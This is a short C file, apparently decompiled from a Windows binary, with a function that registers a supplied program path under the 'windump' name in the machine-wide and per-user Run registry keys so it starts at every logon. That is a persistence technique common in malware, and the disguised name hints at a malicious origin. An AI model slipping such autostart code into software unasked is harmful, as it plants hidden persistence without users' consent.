#include "data_globals.h"
#include <windows.h>
#include <stdint.h>
#include <string.h>   // <-- added for strlen()

void _AutoStart(BYTE *param_1)
{
    LSTATUS LVar1;
    DWORD DVar2;
    HKEY local_10[3];   // can be simplified to HKEY local_10; but keep as is to minimize changes

    LVar1 = RegOpenKeyExA((HKEY)0x80000002, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
                          0x20006, local_10);
    if (LVar1 == 0) {
        DVar2 = strlen((char *)param_1);
        RegSetValueExA(local_10[0], "windump", 0, REG_SZ, param_1, DVar2);
        RegCloseKey(local_10[0]);
    }
    LVar1 = RegOpenKeyExA((HKEY)0x80000001, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
                          0x20006, local_10);
    if (LVar1 == 0) {
        DVar2 = strlen((char *)param_1);
        RegSetValueExA(local_10[0], "windump", 0, REG_SZ, param_1, DVar2);
        RegCloseKey(local_10[0]);
    }
}
